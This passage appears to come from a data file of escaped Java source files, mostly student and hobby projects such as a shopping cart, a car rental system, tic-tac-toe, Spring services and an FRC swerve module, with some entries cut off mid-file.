.addOnCompleteListener(new OnCompleteListener<Void>() {\n                                @Override\n                                public void onComplete(Task<Void> task) {\n                                    if (task.isSuccessful()) {\n                                        // Email atualizado com sucesso\n                                        Toast.makeText(editarPerfil.this, \"Email atualizado com sucesso\", Toast.LENGTH_SHORT).show();\n                                    } else {\n                                        // Falha ao atualizar o email\n                                        Toast.makeText(editarPerfil.this, \"Falha ao atualizar o email: \" + task.getException().getMessage(), Toast.LENGTH_SHORT).show();\n                                    }\n                                }\n                            });\n                } else {\n                    // Caso o campo de email esteja vazio\n                    Toast.makeText(editarPerfil.this, \"Por favor, insira um novo email\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n    }\n}\n",
    "package ee.ut.math.tvt.salessystem.logic;\n\nimport ee.ut.math.tvt.salessystem.dao.SalesSystemDAO;\nimport ee.ut.math.tvt.salessystem.dataobjects.SoldItem;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class ShoppingCart {\n\n    private final SalesSystemDAO dao;\n    private final List<SoldItem> items = new ArrayList<>();\n\n    public ShoppingCart(SalesSystemDAO dao) {\n        this.dao = dao;\n    }\n\n    /**\n     * Add new SoldItem to table.\n     */\n    public void addItem(SoldItem item) {\n        // TODO In case such stockItem already exists increase the quantity of the existing stock\n        //for (SoldItem existingItem: items) {\n        //    if (existingItem.getId().equals(item.getId())) {\n        //        existingItem.setQuantity(existingItem.getQuantity() + item.getQuantity());\n        //        return;\n        //    }\n        //}\n\n        items.add(item);\n        //log.debug(\"Added \" + item.getName() + \" quantity of \" + item.getQuantity());\n    }\n\n    public List<SoldItem> getAll() {\n        return items;\n    }\n\n    public void cancelCurrentPurchase() {\n        items.clear();\n    }\n\n    public void submitCurrentPurchase() {\n        // decrease quantities of the warehouse stock\n\n        // note the use of transactions. InMemorySalesSystemDAO ignores transactions\n        // but when you start using hibernate in lab5, then it will become relevant.\n        // what is a transaction? https://stackoverflow.com/q/974596\n        dao.beginTransaction();\n        try {\n            for (SoldItem item : items) {\n                dao.saveSoldItem(item);\n            }\n            dao.commitTransaction();\n            items.clear();\n        } catch (Exception e) {\n            dao.rollbackTransaction();\n            throw e;\n        }\n    }\n}\n",
    "import java.util.*;\n\nclass BookReview {\n    private String title;\n    private int rating;\n\n    public BookReview(String title, int rating) {\n        this.title = title;\n        this.rating = rating;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public int getRating() {\n        return rating;\n    }\n}\n\npublic class BookReviewAnalyzer {\n    public static void main(String[] args) {\n        // Sample book reviews\n        List<BookReview> bookReviews = new ArrayList<>();\n        bookReviews.add(new BookReview(\"Book 1\", 4));\n        bookReviews.add(new BookReview(\"Book 2\", 7));\n        bookReviews.add(new BookReview(\"Book 3\", 9));\n        bookReviews.add(new BookReview(\"Book 4\", 3));\n        bookReviews.add(new BookReview(\"Book 5\", 6));\n        bookReviews.add(new BookReview(\"Book 6\", 2));\n\n        // Define rating ranges\n        int[] ratingRanges = {1, 5, 10};\n\n        // Initialize counts for positive, neutral, and negative reviews\n        int positiveCount = 0;\n        int neutralCount = 0;\n        int negativeCount = 0;\n\n        // Initialize counts for books within rating ranges\n        Map<String, Integer> ratingRangeCounts = new HashMap<>();\n        for (int i = 0; i < ratingRanges.length - 1; i++) {\n            ratingRangeCounts.put(ratingRanges[i] + \"-\" + ratingRanges[i + 1], 0);\n        }\n\n        // Calculate counts\n        for (BookReview review : bookReviews) {\n            int rating = review.getRating();\n\n            // Check positive, neutral, or negative review\n            if (rating >= 8) {\n                positiveCount++;\n            } else if (rating >= 4) {\n                neutralCount++;\n            } else {\n                negativeCount++;\n            }\n\n            // Check rating range\n            for (int i = 0; i < ratingRanges.length - 1; i++) {\n                if (rating >= ratingRanges[i] && rating <= ratingRanges[i + 1]) {\n                    ratingRangeCounts.put(ratingRanges[i] + \"-\" + ratingRanges[i + 1],\n                            ratingRangeCounts.get(ratingRanges[i] + \"-\" + ratingRanges[i + 1]) + 1);\n                    break;\n                }\n            }\n        }\n\n        // Print results\n        System.out.println(\"Book Review Statistics:\");\n        System.out.println(\"Positive Reviews: \" + positiveCount);\n        System.out.println(\"Neutral Reviews: \" + neutralCount);\n        System.out.println(\"Negative Reviews: \" + negativeCount);\n        System.out.println(\"Books Reviewed Within Rating Ranges:\");\n        for (Map.Entry<String, Integer> entry : ratingRangeCounts.entrySet()) {\n            System.out.println(entry.getKey() + \" Stars: \" + entry.getValue());\n        }\n    }\n}\n\n",
    "package dto;\n\nimport jakarta.xml.bind.annotation.XmlElement;\nimport jakarta.xml.bind.annotation.XmlRootElement;\n\n@XmlRootElement\npublic class UserDto {\n    private String Name;\n    private String email;\n    private String ContactNumber;\n    private String role;\n    private String userPhoto;\n\n    private String username;\n\n    public UserDto() {\n    }\n    @XmlElement\n    public String getName() {\n        return Name;\n    }\n\n    public void setName(String name) {\n        Name = name;\n    }\n    @XmlElement\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n    @XmlElement\n    public String getContactNumber() {\n        return ContactNumber;\n    }\n\n    public void setContactNumber(String contactNumber) {\n        ContactNumber = contactNumber;\n    }\n    @XmlElement\n    public String getRole() {\n        return role;\n    }\n\n    public void setRole(String role) {\n        this.role = role;\n    }\n    @XmlElement\n    public String getUserPhoto() {\n        return userPhoto;\n    }\n\n    public void setUserPhoto(String userPhoto) {\n        this.userPhoto = userPhoto;\n    }\n    @XmlElement\n    public String getUsername() {\n        return username;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n\n}\n",
    "package com.carrentalsystem;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Scanner;\n\nclass Car {\n    private String carId;\n    private String brand;\n    private String model;\n    private double basePricePerDay;\n    private boolean isAvailable;\n\n    public Car(String carId, String brand, String model, double basePricePerDay) {\n        this.carId = carId;\n        this.brand = brand;\n        this.model = model;\n        this.basePricePerDay = basePricePerDay;\n        this.isAvailable = true;\n    }\n    public String getCarId() {\n        return carId;\n    }\n\n    public String getBrand() {\n        return brand;\n    }\n\n    public String getModel() {\n        return model;\n    }\n\n    public double calculatePrice(int rentalDays) {\n        return basePricePerDay * rentalDays;\n    }\n\n    public boolean isAvailable() {\n        return isAvailable;\n    }\n\n    public void rent() {\n        isAvailable = false;\n    }\n\n    public void returnCar() {\n        isAvailable = true;\n    }\n}\n\nclass Customer {\n    private String customerId;\n    private String name;\n\n    public Customer(String customerId, String name) {\n        this.customerId = customerId;\n        this.name = name;\n    }\n\n    public String getCustomerId() {\n        return customerId;\n    }\n\n    public String getName() {\n        return name;\n    }\n}\n\nclass Rental {\n    private Car car;\n    private Customer customer;\n    private int days;\n\n    public Rental(Car car, Customer customer, int days) {\n        this.car = car;\n        this.customer = customer;\n        this.days = days;\n    }\n\n    public Car getCar() {\n        return car;\n    }\n\n    public Customer getCustomer() {\n        return customer;\n    }\n\n    public int getDays() {\n        return days;\n    }\n}\n\nclass CarRentalSystem {\n    private List<Car> cars;\n    private List<Customer> customers;\n    private List<Rental> rentals;\n\n    public CarRentalSystem() {\n        cars = new ArrayList<>();\n        customers = new ArrayList<>();\n        rentals = new ArrayList<>();\n    }\n\n    public void addCar(Car car) {\n        cars.add(car);\n    }\n\n    public void addCustomer(Customer customer) {\n        customers.add(customer);\n    }\n\n    public void rentCar(Car car, Customer customer, int days) {\n        if (car.isAvailable()) {\n            car.rent();\n            rentals.add(new Rental(car, customer, days));\n\n        } else {\n            System.out.println(\"Car is not available for rent.\");\n        }\n    }\n\n    public void returnCar(Car car) {\n        car.returnCar();\n        Rental rentalToRemove = null;\n        for (Rental rental : rentals) {\n            if (rental.getCar() == car) {\n                rentalToRemove = rental;\n                break;\n            }\n        }\n        if (rentalToRemove != null) {\n            rentals.remove(rentalToRemove);\n\n        } else {\n            System.out.println(\"Car was not rented.\");\n        }\n    }\n\n    public void menu() {\n        Scanner scanner = new Scanner(System.in);\n\n        while (true) {\n            System.out.println(\"===== Car Rental System =====\");\n            System.out.println(\"1. Rent a Car\");\n            System.out.println(\"2. Return a Car\");\n            System.out.println(\"3. Exit\");\n            System.out.print(\"Enter your choice: \");\n\n            int choice = scanner.nextInt();\n            scanner.nextLine(); // Consume newline\n\n            if (choice == 1) {\n                System.out.println(\"\\n== Rent a Car ==\\n\");\n                System.out.print(\"Enter your name: \");\n                String customerName = scanner.nextLine();\n\n                System.out.println(\"\\nAvailable Cars:\");\n                for (Car car : cars) {\n                    if (car.isAvailable()) {\n                        System.out.println(car.getCarId() + \" - \" + car.getBrand() + \" \" + car.getModel());\n                    }\n                }\n\n                System.out.print(\"\\nEnter the car ID you want to rent: \");\n                String carId = scanner.nextLine();\n\n                System.out.print(\"Enter the number of days for rental: \");\n                int rentalDays = scanner.nextInt();\n                scanner.nextLine(); // Consume newline\n\n                Customer newCustomer = new Customer(\"CUS\" + (customers.size() + 1), customerName);\n                addCustomer(newCustomer);\n\n                Car selectedCar = null;\n                for (Car car : cars) {\n                    if (car.getCarId().equals(carId) && car.isAvailable()) {\n                        selectedCar = car;\n                        break;\n                    }\n                }\n\n                if (selectedCar != null) {\n                    double totalPrice = selectedCar.calculatePrice(rentalDays);\n                    System.out.println(\"\\n== Rental Information ==\\n\");\n                    System.out.println(\"Customer ID: \" + newCustomer.getCustomerId());\n                    System.out.println(\"Customer Name: \" + newCustomer.getName());\n                    System.out.println(\"Car: \" + selectedCar.get",
    "package ee.ut.math.tvt.salessystem.ui.controllers;\n\nimport ee.ut.math.tvt.salessystem.SalesSystemException;\nimport ee.ut.math.tvt.salessystem.dao.SalesSystemDAO;\nimport ee.ut.math.tvt.salessystem.dataobjects.SoldItem;\nimport ee.ut.math.tvt.salessystem.dataobjects.StockItem;\nimport ee.ut.math.tvt.salessystem.logic.ShoppingCart;\nimport javafx.beans.value.ChangeListener;\nimport javafx.beans.value.ObservableValue;\nimport javafx.collections.FXCollections;\nimport javafx.fxml.FXML;\nimport javafx.fxml.Initializable;\nimport javafx.scene.control.*;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.ResourceBundle;\nimport java.util.stream.Collectors;\nimport java.util.Comparator;\n\n\n/**\n * Encapsulates everything that has to do with the purchase tab (the tab\n * labelled \"Point-of-sale\" in the menu). Consists of the purchase menu,\n * current purchase dialog and shopping cart table.\n */\npublic class PurchaseController implements Initializable {\n\n    private static final Logger log = LogManager.getLogger(PurchaseController.class);\n\n    private final SalesSystemDAO dao;\n    private final ShoppingCart shoppingCart;\n\n    @FXML\n    private Button newPurchase;\n    @FXML\n    private Button submitPurchase;\n    @FXML\n    private Button cancelPurchase;\n    @FXML\n    private TextField barCodeField;\n    @FXML\n    private TextField quantityField;\n    @FXML\n    private ComboBox<String> productNameComboBox;\n    @FXML\n    private TextField priceField;\n    @FXML\n    private Button addItemButton;\n    @FXML\n    private Button editQuantityButton;\n    @FXML\n    private Button removeItemButton;\n    @FXML\n    private Label totalSumLabel;\n\n    private List<SoldItem> items;\n    @FXML\n    private TableView<SoldItem> purchaseTableView;\n\n    public PurchaseController(SalesSystemDAO dao, ShoppingCart shoppingCart) {\n        this.dao = dao;\n        this.shoppingCart = shoppingCart;\n    }\n\n    @Override\n    public void initialize(URL location, ResourceBundle resources) {\n        log.info(\"Initializing PurchaseController\");\n\n        // Populate the ComboBox with product names\n        productNameComboBox.setItems(FXCollections.observableArrayList(\n                dao.findStockItems().stream()\n                        .filter(item -> item.getQuantity() > 0)\n                        .map(StockItem::getName)\n                        .collect(Collectors.toList())\n        ));\n        productNameComboBox.valueProperty().addListener((obs, oldValue, newValue) -> {\n            // When a product is selected, update the other fields accordingly\n            if (newValue != null) {\n                updateProductDetails(newValue);\n            }\n        });\n\n        updateTotalSum();\n\n        // Disabling 'cancel' and 'submit' buttons initially\n        cancelPurchase.setDisable(true);\n        submitPurchase.setDisable(true);\n        log.debug(\"Cancel and Submit buttons disabled\");\n\n\n\n        // Setting items in the purchase table view from the shopping cart\n        purchaseTableView.setItems(FXCollections.observableList(shoppingCart.getAll()));\n        log.debug(\"Purchase table view initialized with items from shopping cart\");\n        FXCollections.sort(purchaseTableView.getItems(), Comparator.comparing(SoldItem::getQuantity));\n\n        // Disabling product input fields initially\n        disableProductField(true);\n        log.debug(\"Product input fields disabled\");\n\n        editQuantityButton.setDisable(true);\n\n        purchaseTableView.getSelectionModel().selectedItemProperty().addListener((obs, oldSelection, newSelection) ->\n                editQuantityButton.setDisable(newSelection == null)\n        );\n\n        removeItemButton.setDisable(true);\n        purchaseTableView.getSelectionModel().selectedItemProperty().addListener((obs, oldSelection, newSelection) ->\n                removeItemButton.setDisable(newSelection == null)\n        );\n\n        // Setting up listener for bar code field to update item details on focus loss\n        this.barCodeField.focusedProperty().addListener(new ChangeListener<Boolean>() {\n            @Override\n            public void changed(ObservableValue<? extends Boolean> arg0, Boolean oldPropertyValue, Boolean newPropertyValue) {\n                if (!newPropertyValue) {\n                    log.debug(\"Bar code field focus lost, updating item details\");\n                    fillInputsBySelectedStockItem();\n                }\n            }\n        });\n\n        log.info(\"PurchaseController initialization complete\");\n    }\n\n    private void updateProductDetails(String productName) {\n        StockItem stockItem = dao.findStockItem(productName);\n        if (stockItem != null) {\n            barCodeField.setText(String.valueOf(stockItem.getId()));\n            priceField.setText(String.format(\"%.2f\", stockItem.getPrice()));\n        }\n    }\n\n    @FXML\n    protected void removeItemButtonClicked() {\n        SoldI",
    "package enkapsulasi;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class kelas {\r\n\r\n    private String Status; \r\n    private int Volume;\r\n    private int Brightness;\r\n    private String Cable;\r\n     \r\n     public kelas () {\r\n        this.Status = \"off\";\r\n        this.Volume = 50;\r\n        this.Brightness = 30;\r\n        this.Cable = \"None\";\r\n    }\r\n\r\n    // LCD Status //\r\n    public void setTurnoff (){\r\n        this.Status = \"off\";\r\n    }\r\n    public void setTurnon (){\r\n        this.Status = \"on\";\r\n    }\r\n    public void setfreeze (){\r\n        this.Status = \"freeze\";\r\n    }\r\n\r\n    // LCD Volume //\r\n    public void setVolume (){\r\n        Scanner input = new Scanner(System.in);\r\n        System.out.println(\"input Volume : \");\r\n        Volume = input.nextInt();\r\n\r\n        if (this.Volume >= 0 && this.Volume <= 100){\r\n            this.Volume = Volume;\r\n        } else {\r\n            System.out.println(\"please set your Volume between 0 - 100\");\r\n        }\r\n    }\r\n    public void setVolumeUp (){\r\n        if (this.Status.equalsIgnoreCase(\"on\")){\r\n            this.Volume ++;\r\n        }\r\n    }\r\n    public void setVolumeDown (){\r\n        if (this.Status.equalsIgnoreCase(\"on\")){\r\n            this.Volume --;\r\n        }\r\n    }\r\n    \r\n    // LCD Brightness //\r\n    public void setBrightness (){\r\n        Scanner input = new Scanner(System.in);\r\n        System.out.println(\"input Brightness : \");\r\n        Brightness = input.nextInt();\r\n\r\n        if (this.Brightness >= 0 && this.Brightness <= 100){\r\n            this.Brightness = Brightness;\r\n        } else {\r\n            System.out.println(\"please set your Brightness between 0 - 100\");\r\n        }\r\n    }\r\n    public void setBrightnessUp (){\r\n        if (this.Status.equalsIgnoreCase(\"on\")){\r\n            this.Brightness ++;\r\n        }\r\n    }\r\n    public void setBrightnessDown (){\r\n        if (this.Status.equalsIgnoreCase(\"on\")){\r\n            this.Brightness --;\r\n        }\r\n    }\r\n\r\n    // LCD Cable //\r\n    public enum cableType {\r\n        HDMI, VGA, DVI, DisplayPort;\r\n    }\r\n    public void setCable (cableType kabel) {\r\n        this.Cable = kabel.name();\r\n    }\r\n\r\n    // Display System //\r\n    public void Display (){\r\n        System.out.println(\"LCD Status: \" + this.Status);\r\n        System.out.println(\"Volume: \" + this.Volume);\r\n        System.out.println(\"Brightness: \" + this.Brightness);\r\n        System.out.println(\"Cable: \" + this.Cable);\r\n    }\r\n\r\n}",
    "package JogoVelha;\r\n\r\npublic class Tabuleiro {\r\n    private char[][] tabuleiro;\r\n\r\n    public Tabuleiro() {\r\n        tabuleiro = new char[3][3];\r\n    }\r\n\r\n    public void inicializarTabuleiro() {\r\n        char valor = '1';\r\n        for (int i = 0; i < 3; i++) {\r\n            for (int j = 0; j < 3; j++) {\r\n                tabuleiro[i][j] = valor;\r\n                valor++;\r\n            }\r\n        }\r\n    }\r\n\r\n    public void mostrarTabuleiro() {\r\n        System.out.println(\"  \" + tabuleiro[0][0] + \" | \" + tabuleiro[0][1] + \" | \" + tabuleiro[0][2]);\r\n        System.out.println(\"  ---------\");\r\n        System.out.println(\"  \" + tabuleiro[1][0] + \" | \" + tabuleiro[1][1] + \" | \" + tabuleiro[1][2]);\r\n        System.out.println(\"  ---------\");\r\n        System.out.println(\"  \" + tabuleiro[2][0] + \" | \" + tabuleiro[2][1] + \" | \" + tabuleiro[2][2]);\r\n        System.out.println(\" \");\r\n    }\r\n\r\n    public boolean fazerJogada(int numero, char simbolo) {\r\n        if (numero >= 1 && numero <= 9) {\r\n            int linha = (numero - 1) / 3;\r\n            int coluna = (numero - 1) % 3;\r\n            if (tabuleiro[linha][coluna] != 'X' && tabuleiro[linha][coluna] != 'O') {\r\n                tabuleiro[linha][coluna] = simbolo;\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public boolean verificarVitoria(char simbolo) {\r\n        for (int i = 0; i < 3; i++) {\r\n            if (tabuleiro[i][0] == simbolo && tabuleiro[i][1] == simbolo && tabuleiro[i][2] == simbolo) {\r\n                return true;\r\n            }\r\n        }\r\n        for (int j = 0; j < 3; j++) {\r\n            if (tabuleiro[0][j] == simbolo && tabuleiro[1][j] == simbolo && tabuleiro[2][j] == simbolo) {\r\n                return true;\r\n            }\r\n        }\r\n        if (tabuleiro[0][0] == simbolo && tabuleiro[1][1] == simbolo && tabuleiro[2][2] == simbolo) {\r\n            return true;\r\n        }\r\n        if (tabuleiro[0][2] == simbolo && tabuleiro[1][1] == simbolo && tabuleiro[2][0] == simbolo) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public boolean estaCheio() {\r\n        for (int i = 0; i < 3; i++) {\r\n            for (int j = 0; j < 3; j++) {\r\n                if (tabuleiro[i][j] != 'X' && tabuleiro[i][j] != 'O') {\r\n                    return false;\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public void desfazerJogada(int linha, int coluna) {\r\n    }\r\n}",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage Main;\n\n/**\n *\n * @author CSN\n */\npublic class Inventory_Management extends javax.swing.JFrame {\n\n    /**\n     * Creates new form Inventory_Management\n     */\n    public Inventory_Management() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 400, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 300, Short.MAX_VALUE)\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(Inventory_Management.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(Inventory_Management.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(Inventory_Management.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(Inventory_Management.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new Inventory_Management().setVisible(true);\n            }\n        });\n    }\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package ru.netology.stats;\n\npublic class StatsService {\n    public long sumSales(long[] sales) {\n        int sum = 0;\n        for (long sale : sales) {\n            sum += sale;\n        }\n        return sum;\n\n\n    }\n\n    public long avgSales(long[] sales) {\n        long sum = sumSales(sales);\n        return sum / sales.length;\n\n    }\n\n\n    public int minMonthSales(int[] sales) {\n        int minMonth = 0;\n\n        for (int i = 0; i < sales.length; i++) {\n            if (sales[i] <= sales[minMonth]) {\n                minMonth = i;\n            }\n        }\n\n        return minMonth + 1;\n    }\n\n    public int maxMonthSales(int[] sales) {\n        int maxMonth = 0;\n\n        for (int i = 0; i < sales.length; i++) {\n            if (sales[i] >= sales[maxMonth]) {\n                maxMonth = i;\n            }\n        }\n\n        return maxMonth + 1;\n    }\n\n    public int salesBelowAvg(long[] sales) {\n        long avg = avgSales(sales);\n        long months = 0;\n        for (long sale : sales) {\n            if (sale < avg) {\n                months++;\n            }\n        }\n        return (int) months;\n    }\n\n    public int salesAboveAvg(long[] sales) {\n        long avg = avgSales(sales);\n        int months = 0;\n        for (long sale : sales) {\n            if (sale > avg) {\n                months++;\n            }\n        }\n        return months;\n    }\n}\n",
    "package com.poc.service.enquiry_impl;\r\n\r\nimport java.util.List;\r\n\r\nimport org.springframework.beans.factory.annotation.Autowired;\r\nimport org.springframework.data.domain.Example;\r\nimport org.springframework.stereotype.Service;\r\n\r\nimport com.poc.DTO.Dashboard;\r\nimport com.poc.entity.Counsellor;\r\nimport com.poc.entity.Enquiry;\r\nimport com.poc.repo.CounsellorRepository;\r\nimport com.poc.repo.EnquiryRepository;\r\nimport com.poc.service.EnquiryService;\r\n\r\n@Service\r\npublic class EnquiryServiceImpl implements EnquiryService {\r\n\r\n\t@Autowired\r\n\tprivate EnquiryRepository enqRepo;\r\n\t\r\n\t@Autowired\r\n\tprivate CounsellorRepository counsellorRepository;\r\n\t\r\n\t\r\n\t@Override\r\n\tpublic Dashboard getDashboardInfo(Integer counsellorID) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tLong totalEnq=enqRepo.getEnquires(counsellorID);\r\n\t\tLong openCnt=enqRepo.getEnquires(counsellorID,\"open\");\r\n\t\tLong lostCnt=enqRepo.getEnquires(counsellorID,\"Lost\");\r\n\t\tLong enrolledCnt=enqRepo.getEnquires(counsellorID,\"Enrolled\");\r\n\t\t\r\n\t\tDashboard d=new Dashboard();\r\n\t\td.setTotalEnqs(totalEnq);\r\n\t\td.setEnrolledEnqs(enrolledCnt);\r\n\t\td.setLostEnqs(lostCnt);\r\n\t\td.setOpenEnqs(openCnt);\r\n\t\t\r\n\t\treturn d;\r\n\t}\r\n\r\n\t@Override\r\n\tpublic boolean addEnquiry(Enquiry enquiry,Integer counsellorId) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tCounsellor counsellor=counsellorRepository.findById(counsellorId).orElseThrow();\r\n\t\tenquiry.setCounsellor(counsellor);//association for fk\r\n\t\tEnquiry savedEnq=enqRepo.save(enquiry);\r\n\t\t\r\n\t\treturn savedEnq.getEnqId()!=null;\r\n\t}\r\n\r\n\t@Override\r\n\tpublic List<Enquiry> getEnquires(Enquiry enquiry, Integer counsellorId) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\t\r\n\t\tCounsellor counsellor=counsellorRepository.findById(counsellorId).orElseThrow();\r\n\t\tenquiry.setCounsellor(counsellor);\r\n\t\t\r\n\t\t//dynamic query creation\r\n\t\tExample <Enquiry> of =Example.of(enquiry);\r\n\t\t\r\n\t\treturn enqRepo.findAll(of);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic Enquiry getEnquiry(Integer enqID) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\treturn enqRepo.findById(enqID).orElseThrow(); \r\n\t}\r\n\r\n}\r\n",
    "/**\n * @author Antonio Terpin\n * @year 2016\n * \n * Pair class\n */\npublic class Pair<A, B> {\n    private A first;\n    private B second;\n\n    public Pair(A first, B second) {\n    \tsuper();\n    \tthis.first = first;\n    \tthis.second = second;\n    }\n\n    public int hashCode() {\n    \tint hashFirst = first != null ? first.hashCode() : 0;\n    \tint hashSecond = second != null ? second.hashCode() : 0;\n\n    \treturn (hashFirst + hashSecond) * hashSecond + hashFirst;\n    }\n\n    public boolean equals(Object other) {\n    \tif (other instanceof Pair) {\n    \t\t@SuppressWarnings(\"rawtypes\")\n\t\t\tPair otherPair = (Pair) other;\n    \t\treturn \n    \t\t((  this.first == otherPair.first ||\n    \t\t\t( this.first != null && otherPair.first != null &&\n    \t\t\t  this.first.equals(otherPair.first))) &&\n    \t\t (\tthis.second == otherPair.second ||\n    \t\t\t( this.second != null && otherPair.second != null &&\n    \t\t\t  this.second.equals(otherPair.second))) );\n    \t}\n    \t\n    \treturn false;\n    }\n\n    public String toString()\n    { \n           return \"(\" + first + \", \" + second + \")\"; \n    }\n\n    public A getFirst() {\n    \treturn first;\n    }\n\n    public void setFirst(A first) {\n    \tthis.first = first;\n    }\n\n    public B getSecond() {\n    \treturn second;\n    }\n\n    public void setSecond(B second) {\n    \tthis.second = second;\n    }\n}",
    "package com.example.demo.service;\r\n\r\nimport com.example.demo.model.Funcionario;\r\nimport org.springframework.stereotype.Service;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\n@Service\r\npublic class FuncionarioService {\r\n\r\n    private List<Funcionario> funcionarios = new ArrayList<>();\r\n    private Long proximoId = 1L;\r\n\r\n    public List<Funcionario> listarFuncionarios() {\r\n        return funcionarios;\r\n    }\r\n\r\n    public Funcionario criar(Funcionario funcionario) {\r\n        funcionario.setId(proximoId++);\r\n        funcionarios.add(funcionario);\r\n        return funcionario;\r\n    }\r\n\r\n    public Funcionario atualizar(Long id, Funcionario funcionarioAtualizado) {\r\n        Funcionario funcionarioExistente = buscarPorId(id);\r\n        if (funcionarioExistente != null) {\r\n            funcionarioExistente.setNome(funcionarioAtualizado.getNome());\r\n            funcionarioExistente.setCpf(funcionarioAtualizado.getCpf());\r\n            // Outros atributos a serem atualizados, se necess\u00e1rio\r\n\r\n            return funcionarioExistente;\r\n        }\r\n        return null;\r\n    }\r\n\r\n    public boolean deletar(Long id) {\r\n        Funcionario funcionario = buscarPorId(id);\r\n        if (funcionario != null) {\r\n            funcionarios.remove(funcionario);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public Funcionario buscarPorId(Long id) {\r\n        for (Funcionario funcionario : funcionarios) {\r\n            if (funcionario.getId().equals(id)) {\r\n                return funcionario;\r\n            }\r\n        }\r\n        return null;\r\n    }\r\n\r\n    public int qtdFuncionarios() {\r\n        return funcionarios.size();\r\n    }\r\n}",
    "// Copyright (c) FIRST and other WPILib contributors.\n// Open Source Software; you can modify and/or share it under the terms of\n// the WPILib BSD license file in the root directory of this project.\n\npackage frc.robot.subsystems;\n\nimport edu.wpi.first.math.geometry.Rotation2d;\nimport edu.wpi.first.math.kinematics.SwerveModulePosition;\nimport edu.wpi.first.math.kinematics.SwerveModuleState;\n\nimport com.revrobotics.CANSparkMax;\nimport com.revrobotics.CANSparkMaxLowLevel.MotorType;\nimport com.revrobotics.SparkMaxAbsoluteEncoder.Type;\nimport com.revrobotics.SparkMaxPIDController;\nimport com.revrobotics.AbsoluteEncoder;\nimport com.revrobotics.RelativeEncoder;\n\nimport frc.robot.Constants.ModuleConstants;\n\npublic class MAXSwerveModule {\n  private final CANSparkMax m_drivingSparkMax;\n  private final CANSparkMax m_turningSparkMax;\n\n  private final RelativeEncoder m_drivingEncoder;\n  private final AbsoluteEncoder m_turningEncoder;\n\n  private final SparkMaxPIDController m_drivingPIDController;\n  private final SparkMaxPIDController m_turningPIDController;\n\n  private double m_chassisAngularOffset = 0;\n  private SwerveModuleState m_desiredState = new SwerveModuleState(0.0, new Rotation2d());\n\n  /**\n   * Constructs a MAXSwerveModule and configures the driving and turning motor,\n   * encoder, and PID controller. This configuration is specific to the REV\n   * MAXSwerve Module built with NEOs, SPARKS MAX, and a Through Bore\n   * Encoder.\n   */\n  public MAXSwerveModule(int drivingCANId, int turningCANId, double chassisAngularOffset) {\n    m_drivingSparkMax = new CANSparkMax(drivingCANId, MotorType.kBrushless);\n    m_turningSparkMax = new CANSparkMax(turningCANId, MotorType.kBrushless);\n\n    // Factory reset, so we get the SPARKS MAX to a known state before configuring\n    // them. This is useful in case a SPARK MAX is swapped out.\n    m_drivingSparkMax.restoreFactoryDefaults();\n    m_turningSparkMax.restoreFactoryDefaults();\n\n    // Setup encoders and PID controllers for the driving and 